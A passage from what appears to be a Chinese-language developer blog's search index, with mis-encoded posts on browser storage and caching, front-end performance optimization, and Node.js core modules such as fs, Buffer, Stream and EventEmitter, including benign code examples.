é€’ï¼Œè€ŒsessionStorageå’ŒlocalStorageä¸ä¼šè‡ªåŠ¨æŠŠæ•°æ®å‘é€ç»™æœåŠ¡å™¨ï¼Œä»…åœ¨æœ¬åœ°ä¿å­˜ã€‚cookieæ•°æ®è¿˜æœ‰è·¯å¾„ï¼ˆpathï¼‰çš„æ¦‚å¿µï¼Œå¯ä»¥é™åˆ¶cookieåªå±äºæŸä¸ªè·¯å¾„ä¸‹</li><li>å­˜å‚¨å¤§å°é™åˆ¶ä¹Ÿä¸åŒï¼Œcookieæ•°æ®ä¸èƒ½è¶…è¿‡4Kï¼ŒåŒæ—¶å› ä¸ºæ¯æ¬¡httpè¯·æ±‚éƒ½ä¼šæºå¸¦cookieã€æ‰€ä»¥cookieåªé€‚åˆä¿å­˜å¾ˆå°çš„æ•°æ®ï¼Œå¦‚ä¼šè¯æ ‡è¯†ã€‚sessionStorageå’ŒlocalStorageè™½ç„¶ä¹Ÿæœ‰å­˜å‚¨å¤§å°çš„é™åˆ¶ï¼Œä½†æ¯”cookieå¤§å¾—å¤šï¼Œå¯ä»¥è¾¾åˆ°5Mæˆ–æ›´å¤§</li><li>æ•°æ®æœ‰æ•ˆæœŸä¸åŒï¼ŒsessionStorageï¼šä»…åœ¨å½“å‰æµè§ˆå™¨çª—å£å…³é—­ä¹‹å‰æœ‰æ•ˆï¼›localStorageï¼šå§‹ç»ˆæœ‰æ•ˆï¼Œçª—å£æˆ–æµè§ˆå™¨å…³é—­ä¹Ÿä¸€ç›´ä¿å­˜ï¼Œå› æ­¤ç”¨ä½œæŒä¹…æ•°æ®ï¼›cookieï¼šåªåœ¨è®¾ç½®çš„cookieè¿‡æœŸæ—¶é—´ä¹‹å‰æœ‰æ•ˆï¼Œå³ä½¿çª—å£å…³é—­æˆ–æµè§ˆå™¨å…³é—­</li><li>ä½œç”¨åŸŸä¸åŒï¼ŒsessionStorageä¸åœ¨ä¸åŒçš„æµè§ˆå™¨çª—å£ä¸­å…±äº«ï¼Œå³ä½¿æ˜¯åŒä¸€ä¸ªé¡µé¢ï¼›localstorageåœ¨æ‰€æœ‰åŒæºçª—å£ä¸­éƒ½æ˜¯å…±äº«çš„ï¼›cookieä¹Ÿæ˜¯åœ¨æ‰€æœ‰åŒæºçª—å£ä¸­éƒ½æ˜¯å…±äº«çš„</li><li>web Storageæ”¯æŒäº‹ä»¶é€šçŸ¥æœºåˆ¶ï¼Œå¯ä»¥å°†æ•°æ®æ›´æ–°çš„é€šçŸ¥å‘é€ç»™ç›‘å¬è€…ã€‚æ¥å£ä½¿ç”¨æ›´æ–¹ä¾¿</li></ul><p><br></p><h3 id="4-ç¦»çº¿ç¼“å­˜PWA"><a href="#4-ç¦»çº¿ç¼“å­˜PWA" class="headerlink" title="4. ç¦»çº¿ç¼“å­˜PWA"></a>4. ç¦»çº¿ç¼“å­˜PWA</h3><p>ä½¿ç”¨Service Workerå®ç°ç¦»çº¿å¯ç”¨çš„åº”ç”¨ï¼Œç”šè‡³åœ¨ç¦»çº¿æ—¶ï¼Œå¯ä»¥åº”ç”¨XHRæ•°æ®ï¼Œæé«˜å“åº”é€Ÿåº¦ã€‚<br><a href="">æŸ¥çœ‹Demo</a><br><img src="/2019/10/08/ç¼“å­˜/8.png" style="max-width:500px; margin: 30px auto"></p><ul><li>åœ¨index.jsä¸­æ³¨å†ŒService Worker(sw.js)</li><li>åœ¨sw.jsä¸­åˆ—ä¸€ä¸ªèµ„æºåˆ—è¡¨(ç¦»çº¿æ—¶æ˜¾ç¤ºçš„é¡µé¢)ï¼Œå½“Server Workerè¢«æ¿€æ´»æ—¶ï¼Œå°†åˆ—è¡¨ä¸­çš„èµ„æºç¼“å­˜è¿›cache</li><li>æ‹¦æˆªæµè§ˆå™¨è¯·æ±‚ï¼šå½“æµè§ˆå™¨è¯·æ±‚å„ç±»é™æ€èµ„æº(html/js/css/img)æ—¶ï¼Œ Service Workeræ‹¦æˆªè¯¥è¯·æ±‚ï¼Œå¹¶æŸ¥è¯¢å½“å‰cacheã€‚è‹¥å­˜åœ¨cacheåˆ™ç›´æ¥è¿”å›ï¼Œå…ˆæ¸²æŸ“æ•°æ®ã€‚ç„¶åé€šè¿‡fetchæ–¹æ³•å‘æœåŠ¡ç«¯å‘èµ·è¯·æ±‚ã€‚</li></ul><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://github.com/amandakelake/blog/issues/43" target="_blank" rel="noopener">ç¼“å­˜æ€»è§ˆï¼šä»æ€§èƒ½ä¼˜åŒ–çš„è§’åº¦çœ‹ç¼“å­˜</a></li><li><a href="https://blog.csdn.net/garrettzxd/article/details/80684880" target="_blank" rel="noopener">from memory cacheä¸from disk cacheè¯¦è§£</a></li><li><a href="https://www.jianshu.com/p/54cc04190252" target="_blank" rel="noopener">æ·±å…¥ç†è§£æµè§ˆå™¨çš„ç¼“å­˜æœºåˆ¶</a></li><li><a href="https://juejin.im/post/5c4528a6f265da611a4822cc" target="_blank" rel="noopener">å®è·µè¿™ä¸€æ¬¡,å½»åº•ææ‡‚æµè§ˆå™¨ç¼“å­˜æœºåˆ¶</a></li><li><a href="https://juejin.im/post/5aca14b6f265da237c692e6f" target="_blank" rel="noopener">ã€PWAå­¦ä¹ ä¸å®è·µã€‘(3) è®©ä½ çš„WebAppç¦»çº¿å¯ç”¨</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>æ€§èƒ½ä¼˜åŒ–</title>
      <link href="/2019/09/30/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
      <url>/2019/09/30/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/</url>
      <content type="html"><![CDATA[<p>ä»è¾“å…¥ URL åˆ°é¡µé¢åŠ è½½å®Œæˆï¼Œç»å†äº†ä¸‹é¢å‡ ä¸ªæ­¥éª¤ï¼Œé’ˆå¯¹è¿™äº›æ­¥éª¤é€ä¸ªä¼˜åŒ–ï¼š</p><table><thead><tr><th>ä¼˜åŒ–ç‚¹</th><th style="text-align:center">é—®é¢˜</th><th style="text-align:right">è§£å†³</th></tr></thead><tbody><tr><td>DNSè§£æ</td><td style="text-align:center">å‡å°‘DNSè§£ææ¬¡æ•°ï¼ŒæŠŠè§£æå‰ç½®ï¼Ÿ</td><td style="text-align:right">DNSç¼“å­˜å’ŒDNS prefetch</td></tr><tr><td>TCPè¿æ¥</td><td style="text-align:center">TCPä¸‰æ¬¡æ¡æ‰‹ï¼Œæ—¶é—´å¤ªä¹…ï¼Ÿ</td><td style="text-align:right">é•¿è¿æ¥ï¼Œé¢„è¿æ¥ï¼Œæ¥å…¥SPDYåè®®</td></tr><tr><td>HTTPè¯·æ±‚</td><td style="text-align:center">HTTPè¯·æ±‚æ€ä¹ˆä¼˜åŒ–ï¼Ÿ</td><td style="text-align:right">å‡å°‘è¯·æ±‚æ¬¡æ•°å’Œè¯·æ±‚ä½“ç§¯ï¼ŒCDNç­‰ç½‘ç»œå±‚é¢çš„æ€§èƒ½ä¼˜åŒ–</td></tr><tr><td>æµè§ˆå™¨æ¸²æŸ“</td><td style="text-align:center">æ‹¿åˆ°å†…å®¹åï¼Œå¦‚ä½•åŠ å¿«å“åº”é€Ÿåº¦ï¼Ÿ</td><td style="text-align:right">èµ„æºåŠ è½½ä¼˜åŒ–ã€æœåŠ¡ç«¯æ¸²æŸ“ã€æµè§ˆå™¨ç¼“å­˜æœºåˆ¶ã€DOMæ ‘æ„å»ºã€<br>ç½‘é¡µæ’ç‰ˆå’Œæ¸²æŸ“ã€å›æµå’Œé‡ç»˜ã€DOMæ“ä½œåˆç†è§„é¿ç­‰é—®é¢˜ã€‚</td></tr></tbody></table><p>æ€»çš„æ¥è¯´ï¼Œå‰ç«¯æ€§èƒ½ä¼˜åŒ–å¯ä»¥åˆ†ä¸º <em>ç½‘ç»œå±‚é¢</em> å’Œ <em>æ¸²æŸ“å±‚é¢</em> ä¸¤ä¸ªå¤§ç‚¹ã€‚<br><em>ç»ˆææ–¹æ¡ˆï¼š æœåŠ¡å™¨æ¸²æŸ“SSR</em></p><p><br></p><h3 id="1-ç½‘ç»œå±‚é¢"><a href="#1-ç½‘ç»œå±‚é¢" class="headerlink" title="1. ç½‘ç»œå±‚é¢"></a>1. ç½‘ç»œå±‚é¢</h3><h4 id="1-1-HTTP"><a href="#1-1-HTTP" class="headerlink" title="1.1 HTTP"></a>1.1 HTTP</h4><ol><li><p>æµè§ˆå™¨ç¼“å­˜</p><ul><li>å¯¹äºä¸éœ€è¦ç¼“å­˜çš„èµ„æºï¼Œä½¿ç”¨Cache-control: no-store</li><li>å¯¹äºé¢‘ç¹å˜åŠ¨çš„èµ„æºï¼Œä½¿ç”¨Cache-control: no-cacheå¹¶é…åˆETagï¼Œè¡¨ç¤ºè¯¥èµ„æºå·²è¢«ç¼“å­˜ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½ä¼šå‘é€è¯·æ±‚è¯¢é—®èµ„æºæ˜¯å¦éœ€è¦æ›´æ–°</li><li>å¯¹äºä»£ç æ–‡ä»¶ï¼Œé€šå¸¸ä½¿ç”¨Cache-control: max-age=31536000å¼ºç¼“å­˜ï¼Œç„¶åå¯¹æ–‡ä»¶è¿›è¡ŒæŒ‡çº¹å¤„ç†ï¼Œä¸€æ—¦æ–‡ä»¶åå˜åŠ¨å°±ä¼šç«‹åˆ»ä¸‹è½½æ–°çš„æ–‡ä»¶</li></ul></li><li><p>æ–‡ä»¶å‹ç¼©<br>åœ¨request headerä¸­åŠ ä¸Š<code>accept-encoding:gzip</code></p></li><li><p>èµ„æºéƒ¨ç½²</p><ul><li>å¤šä¸ªåœ°å€ï¼š HTMLéƒ¨ç½²åˆ°<code>www.example.org</code>ï¼Œè€ŒæŠŠjs, cssé™æ€èµ„æºåˆ†ç¦»åˆ°<code>static.example.org</code>ã€‚æœ€å¤§åŒ–å¹¶è¡Œä¸‹è½½ï¼ˆæµè§ˆå™¨é™åˆ¶6ä¸ªï¼‰</li><li>cdnåŠ é€Ÿ</li></ul></li></ol><p><br></p><h4 id="1-2-Webpackä¼˜åŒ–"><a href="#1-2-Webpackä¼˜åŒ–" class="headerlink" title="1.2 Webpackä¼˜åŒ–"></a>1.2 Webpackä¼˜åŒ–</h4><ul><li>åˆ†åŒ…<ul><li>æ‡’åŠ è½½</li><li>å‡å°‘ä½“ç§¯è¿‡å¤§çš„æ¨¡å—</li></ul></li><li>å‹ç¼©ï¼Œtree shaking, </li><li>å›¾ç‰‡ä¼˜åŒ–<ul><li>å›¾ç‰‡å‹ç¼©: é€‚å½“ç¼©å°å°ºå¯¸ã€åˆ†è¾¨ç‡ã€é€‰æ‹©é«˜å‹ç¼©ç‡çš„æ ¼å¼ï¼Œæœ‰æŸæ ¼å¼åº”è¯¥ç”¨ JPEGï¼Œæ— æŸæ ¼å¼åº”è¯¥ç”¨ Webp æ ¼å¼ã€‚åˆå¹¶ç…§ç‰‡</li><li>å°å›¾ç‰‡ä½¿ç”¨base64</li><li>å›¾æ ‡ä½¿ç”¨svgï¼Œä½¿ç”¨svgoå‹ç¼©</li><li>ä»£ç ç»˜åˆ¶ä»£æ›¿å›¾ç‰‡ï¼šä¸€äº›å¯ä»¥ç”¨ä»£ç ç”»å‡ºæ¥çš„ç´ æï¼Œæ¸å˜å¤§èƒŒæ™¯å›¾</li></ul></li></ul><p><br></p><h3 id="2-æ¸²æŸ“å±‚é¢"><a href="#2-æ¸²æŸ“å±‚é¢" class="headerlink" title="2. æ¸²æŸ“å±‚é¢"></a>2. æ¸²æŸ“å±‚é¢</h3><ol><li>æ¸²æŸ“ä¼˜åŒ–<ul><li>å‡å°‘é¡µé¢é‡æ’ã€é‡ç»˜ï¼š<a href="https://www.notion.so/8d865ce2e9474b74b499fc8398ca5a9d" target="_blank" rel="noopener">å›æµã€é‡ç»˜ã€åˆæˆ</a> </li><li>å°‘ç”¨é«˜æ€§èƒ½CSSå±æ€§ï¼šæµ®åŠ¨ã€å®šä½</li><li>é€‰æ‹©å™¨ä¼˜åŒ–ï¼šé¿å…å±‚çº§è¿‡æ·±ï¼Œå°½é‡ä¸é€‚ç”¨tagé€‰æ‹©å™¨ï¼Œå› ä¸ºCSSé€‰æ‹©ç¬¦æ˜¯ä»å³åˆ°å·¦è¿›è¡ŒåŒ¹é…çš„ï¼Œä¼šåŒ¹é…åˆ°å¾ˆå¤šå…ƒç´ </li></ul></li><li><em>äº‹ä»¶å§”æ‰˜</em>ï¼šé¿å…å¤ªå¤šäº‹ä»¶å¤„ç†å™¨è¢«æ·»åŠ åˆ°DOMå…ƒç´ ä¸Š</li><li><em>è™šæ‹Ÿåˆ—è¡¨</em>ï¼šé¿å…é¡µé¢å…ƒç´ å¤ªå¤šé€ æˆå¡é¡¿</li><li><em>å†…å­˜ç®¡ç†</em>ï¼šåŠæ—¶è§£é™¤äº‹ä»¶ç›‘å¬ã€æ¸…é™¤å®šæ—¶å™¨ï¼Œé¿å…å†…å­˜æ³„æ¼</li><li><em>ServiceWorker</em>ï¼šå¼€é”€å¤§çš„æ“ä½œæ–°å¼€ä¸€ä¸ªçº¿ç¨‹æ“ä½œï¼Œé¿å…é€ æˆå¡é¡¿</li><li>äº‹ä»¶é˜²æŠ–å’ŒèŠ‚æµ</li><li>ç»„ä»¶çº§ä¼˜åŒ–<ul><li>å‡å°‘ä½¿ç”¨å†…è”å‡½æ•°çš„å†™æ³•<code>v-click=&quot;() =&gt; {}&quot;</code>ï¼Œå‡å°‘ä¸å¿…è¦çš„æ¸²æŸ“</li><li><code>useMemo</code>, <code>useCallback</code>, <code>v-once/v-memo</code>æ‰‹åŠ¨æ ‡è®°ç¼“å­˜ç»„ä»¶å’Œè®¡ç®—ç»“æœï¼Œä¹Ÿæ˜¯ä¸ºäº†å‡å°‘ä¸å¿…è¦çš„æ¸²æŸ“</li><li>vue3ä¸­ä½¿ç”¨<code>shallowRef</code>ä»£æ›¿æ”¾å¼ƒæ·±å±‚å“åº”æ€§ï¼Œåªæœ‰<code>.value</code>çš„è®¿é—®è¢«è¿½è¸ªã€‚æµ…å±‚refå¯é¿å…å¤§å‹æ•°æ®çš„å“åº”æ€§å¼€é”€</li></ul></li><li>å‡å°‘httpè¯·æ±‚: vuex, reduxä¿ç•™å…¨å±€æ•°æ®</li><li>ç»„ä»¶æ‡’åŠ è½½: <code>() =&gt; import()</code>å¼‚æ­¥åŠ è½½ç»„ä»¶</li></ol><p>10.ç”¨ImmerJS: ä½¿ç”¨<code>Proxy</code>å®ç°äº†æ•°æ®æ‹·è´ï¼Œæ•°æ®ä¿®æ”¹å¼€é”€æ›´å° </p><p><br></p><h3 id="3-æ€§èƒ½ç›‘æ§æŒ‡æ ‡"><a href="#3-æ€§èƒ½ç›‘æ§æŒ‡æ ‡" class="headerlink" title="3. æ€§èƒ½ç›‘æ§æŒ‡æ ‡"></a>3. æ€§èƒ½ç›‘æ§æŒ‡æ ‡</h3><p>æŒ‡æ ‡    ç›®æ ‡å€¼    æµ‹é‡å·¥å…·<br>é¦–å±åŠ è½½æ—¶é—´ï¼ˆFCPï¼‰    &lt;1.5 ç§’    Lighthouse<br>æœ€å¤§å†…å®¹ç»˜åˆ¶ï¼ˆLCPï¼‰    &lt;2.5 ç§’    Web Vitals<br>è¾“å…¥å»¶è¿Ÿï¼ˆINPï¼‰    &lt;200 æ¯«ç§’    Chrome DevTools<br>JavaScript æ‰§è¡Œæ—¶é—´    &lt;300 æ¯«ç§’    Performance é¢æ¿</p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://www.cnblogs.com/xianyulaodi/p/5755079.html" target="_blank" rel="noopener">é›…è™å‰ç«¯ä¼˜åŒ–çš„35æ¡å†›è§„</a></li><li><a href="https://www.zhihu.com/search?type=content&amp;q=%E9%9B%85%E8%99%8E%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96" target="_blank" rel="noopener">ã€æ€§èƒ½ä¼˜åŒ–æŒ‡å—ã€‘å’Œä½ ä¸€èµ·å…¨é¢äº†è§£å‰ç«¯æ€§èƒ½ä¼˜åŒ–</a></li><li><a href="https://juejin.im/post/5c4418006fb9a049c043545e" target="_blank" rel="noopener">2019 å‰ç«¯æ€§èƒ½ä¼˜åŒ–å¹´åº¦æ€»ç»“</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Next.js åŸºäºReactçš„æœåŠ¡ç«¯æ¸²æŸ“</title>
      <link href="/2019/09/26/Nextjs/"/>
      <url>/2019/09/26/Nextjs/</url>
      <content type="html"><![CDATA[]]></content>
      
      <categories>
          
          <category> å…¨æ ˆ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>NodeJSå¸¸ç”¨æ¨¡å—</title>
      <link href="/2019/09/26/NodeJS%E6%96%87%E6%A1%A3/"/>
      <url>/2019/09/26/NodeJS%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<p>Node.js ä¸æ˜¯ä¸€é—¨è¯­è¨€ä¹Ÿä¸æ˜¯æ¡†æ¶ï¼Œå®ƒåªæ˜¯åŸºäº Google V8 å¼•æ“çš„ JavaScript è¿è¡Œæ—¶ç¯å¢ƒï¼ŒåŒæ—¶ç»“åˆ Libuv æ‰©å±•äº† JavaScript åŠŸèƒ½ï¼Œä½¿ä¹‹æ”¯æŒ ioã€fs ç­‰åªæœ‰è¯­è¨€æ‰æœ‰çš„ç‰¹æ€§ï¼Œä½¿å¾— JavaScript èƒ½å¤ŸåŒæ—¶å…·æœ‰ DOM æ“ä½œ(æµè§ˆå™¨)å’Œ I/Oã€æ–‡ä»¶è¯»å†™ã€æ“ä½œæ•°æ®åº“(æœåŠ¡å™¨ç«¯)ç­‰èƒ½åŠ›ï¼Œæ˜¯ç›®å‰æœ€ç®€å•çš„å…¨æ ˆå¼è¯­è¨€ã€‚</p><h3 id="1-å…¨å±€å¯¹è±¡"><a href="#1-å…¨å±€å¯¹è±¡" class="headerlink" title="1. å…¨å±€å¯¹è±¡"></a>1. å…¨å±€å¯¹è±¡</h3><p><em>çœŸæ­£çš„å…¨å±€å¯¹è±¡</em></p><ul><li>Buffer</li><li>process</li><li>console</li><li>clearIntervalã€setInterval</li><li>clearTimeoutã€setTimeout</li><li>global</li></ul><p><em>æ¨¡å—çº§åˆ«çš„å…¨å±€å¯¹è±¡</em></p><ul><li>__dirnameï¼š è·å–å½“å‰æ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„ï¼Œä¸åŒ…æ‹¬åé¢çš„æ–‡ä»¶å</li><li>__filenameï¼šè·å–å½“å‰æ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„å’Œæ–‡ä»¶åç§°ï¼ŒåŒ…æ‹¬åé¢çš„æ–‡ä»¶åç§°</li><li>exports</li><li>module</li><li>require</li></ul><p><br></p><h3 id="2-process"><a href="#2-process" class="headerlink" title="2. process"></a>2. process</h3><p>å½“å‰ Node.js è¿›ç¨‹çš„ä¿¡æ¯</p><ul><li>process.envï¼šç¯å¢ƒå˜é‡ï¼Œä¾‹å¦‚é€šè¿‡ `process.env.NODE_ENV è·å–ä¸åŒç¯å¢ƒé¡¹ç›®é…ç½®ä¿¡æ¯</li><li>process.argvï¼šä¼ å…¥çš„å‘½ä»¤è¡Œå‚æ•°</li><li>process.nextTickï¼šè¿™ä¸ªåœ¨è°ˆåŠ EventLoop æ—¶ç»å¸¸ä¸ºä¼šæåˆ°</li><li>process.pidï¼šè·å–å½“å‰è¿›ç¨‹id</li><li>process.ppidï¼šå½“å‰è¿›ç¨‹å¯¹åº”çš„çˆ¶è¿›ç¨‹</li><li>process.cwd()ï¼šè·å–å½“å‰è¿›ç¨‹å·¥ä½œç›®å½•ï¼Œ</li><li>process.platformï¼šè·å–å½“å‰è¿›ç¨‹è¿è¡Œçš„æ“ä½œç³»ç»Ÿå¹³å°</li><li>process.uptime()ï¼šå½“å‰è¿›ç¨‹å·²è¿è¡Œæ—¶é—´ï¼Œä¾‹å¦‚ï¼špm2 å®ˆæŠ¤è¿›ç¨‹çš„ uptime å€¼</li><li>è¿›ç¨‹äº‹ä»¶ï¼š process.on(â€˜uncaughtExceptionâ€™,cb) æ•è·å¼‚å¸¸ä¿¡æ¯ã€ process.on(â€˜exitâ€™,cbï¼‰è¿›ç¨‹æ¨å‡ºç›‘å¬</li><li>ä¸‰ä¸ªæ ‡å‡†æµï¼š process.stdout æ ‡å‡†è¾“å‡ºã€ process.stdin æ ‡å‡†è¾“å…¥ã€ process.stderr æ ‡å‡†é”™è¯¯è¾“å‡º</li><li>process.title æŒ‡å®šè¿›ç¨‹åç§°ï¼Œæœ‰çš„æ—¶å€™éœ€è¦ç»™è¿›ç¨‹æŒ‡å®šä¸€ä¸ªåç§°</li></ul><p><br></p><h3 id="3-fs"><a href="#3-fs" class="headerlink" title="3. fs"></a>3. fs</h3><p>è¯»å–æœ¬åœ°æ–‡ä»¶çš„èƒ½åŠ›</p><ul><li>æ–‡ä»¶è¯»å–: readFileSync, fs.readFile</li><li>æ–‡ä»¶å†™å…¥ï¼šwriteFileSync, writeFile</li><li>æ–‡ä»¶è¿½åŠ å†™å…¥ï¼šappendFileSyncï¼ŒappendFile</li><li>æ–‡ä»¶æ‹·è´ï¼šcopyFileSyncï¼ŒcopyFile</li><li>åˆ›å»ºç›®å½•ï¼šmkdirSyncï¼Œmkdir<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"><span class="keyword">let</span> buf = fs.readFileSync(<span class="string">"1.txt"</span>);</span><br><span class="line"><span class="keyword">let</span> data = fs.readFileSync(<span class="string">"1.txt"</span>, <span class="string">"utf8"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(buf); <span class="comment">// &lt;Buffer 48 65 6c 6c 6f&gt;</span></span><br><span class="line"><span class="built_in">console</span>.log(data); <span class="comment">// Hello</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="4-buffer-ç¼“å†²åŒº"><a href="#4-buffer-ç¼“å†²åŒº" class="headerlink" title="4. buffer(ç¼“å†²åŒº)"></a>4. buffer(ç¼“å†²åŒº)</h3><p>Bufferå°±æ˜¯åœ¨å†…å­˜ä¸­å¼€è¾Ÿä¸€ç‰‡åŒºåŸŸï¼ˆåˆæ¬¡åˆå§‹åŒ–ä¸º8KBï¼‰ï¼Œç”¨æ¥å­˜æ”¾äºŒè¿›åˆ¶æ•°æ®ã€‚å¦‚æœæ•°æ®åˆ°è¾¾çš„é€Ÿåº¦æ¯”è¿›ç¨‹æ¶ˆè€—çš„é€Ÿåº¦å¿«ï¼Œé‚£ä¹ˆå°‘æ•°æ—©åˆ°è¾¾çš„æ•°æ®ä¼šå¤„äºç­‰å¾…åŒºç­‰å€™è¢«å¤„ç†ã€‚åä¹‹ï¼Œå¦‚æœæ•°æ®åˆ°è¾¾çš„é€Ÿåº¦æ¯”è¿›ç¨‹æ¶ˆè€—çš„æ•°æ®æ…¢ï¼Œé‚£ä¹ˆæ—©å…ˆåˆ°è¾¾çš„æ•°æ®éœ€è¦ç­‰å¾…ä¸€å®šé‡çš„æ•°æ®åˆ°è¾¾ä¹‹åæ‰èƒ½è¢«å¤„ç†ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> inputStream = fs.createReadStream(<span class="string">'input.txt'</span>); <span class="comment">// åˆ›å»ºå¯è¯»æµ</span></span><br><span class="line"><span class="keyword">const</span> outputStream = fs.createWriteStream(<span class="string">'output.txt'</span>); <span class="comment">// åˆ›å»ºå¯å†™æµ</span></span><br><span class="line">inputStream.pipe(outputStream); <span class="comment">// ç®¡é“è¯»å†™</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-Stream"><a href="#5-Stream" class="headerlink" title="5. Stream"></a>5. Stream</h3><p>æµï¼ˆStreamï¼‰ï¼Œæ˜¯ä¸€ä¸ªæ•°æ®ä¼ è¾“æ‰‹æ®µï¼Œæ˜¯ç«¯åˆ°ç«¯ä¿¡æ¯äº¤æ¢çš„ä¸€ç§æ–¹å¼ï¼Œè€Œä¸”æ˜¯æœ‰é¡ºåºçš„,æ˜¯é€å—è¯»å–æ•°æ®ã€å¤„ç†å†…å®¹ï¼Œç”¨äºé¡ºåºè¯»å–è¾“å…¥æˆ–å†™å…¥è¾“å‡ºã€‚</p><ul><li>createReadStream</li><li>createWriteStream</li><li>getè¯·æ±‚è¿”å›ç»™å®¢æˆ·ç«¯<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> server = http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> method = req.method; <span class="comment">// è·å–è¯·æ±‚æ–¹æ³•</span></span><br><span class="line">  <span class="keyword">if</span> (method === <span class="string">'GET'</span>) &#123; <span class="comment">// get è¯·æ±‚</span></span><br><span class="line">    <span class="keyword">const</span> fileName = path.resolve(__dirname, <span class="string">'data.txt'</span>);</span><br><span class="line">    <span class="keyword">let</span> stream = fs.createReadStream(fileName);</span><br><span class="line">    stream.pipe(res); <span class="comment">// å°† res ä½œä¸º stream çš„ dest</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="6-EventEmit"><a href="#6-EventEmit" class="headerlink" title="6. EventEmit"></a>6. EventEmit</h3><p>è§‚å¯Ÿè€…æ¨¡å¼ï¼Œè¢«è§‚å¯Ÿè€…(ä¸»ä½“)ç»´æŠ¤ç€ä¸€ç»„å…¶ä»–å¯¹è±¡æ´¾æ¥(æ³¨å†Œ)çš„è§‚å¯Ÿè€…ï¼Œæœ‰æ–°çš„å¯¹è±¡å¯¹ä¸»ä½“æ„Ÿå…´è¶£å°±æ³¨å†Œè§‚å¯Ÿè€…ï¼Œä¸æ„Ÿå…´è¶£å°±å–æ¶ˆè®¢é˜…ï¼Œä¸»ä½“æœ‰æ›´æ–°çš„è¯å°±ä¾æ¬¡é€šçŸ¥è§‚å¯Ÿè€…ä»¬<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®ç°ä»£ç </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EventEmitter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">this</span>.events = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  on(type, handler) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.events[type]) &#123;</span><br><span class="line">      <span class="keyword">this</span>.events[type] = [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.events[type].push(handler);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  addListener(type,handler)&#123;</span><br><span class="line">    <span class="keyword">this</span>.on(type,handler)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  prependListener(type, handler) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.events[type]) &#123;</span><br><span class="line">      <span class="keyword">this</span>.events[type] = [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.events[type].unshift(handler);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  removeListener(type, handler) &#123;</span><br><span class="line">    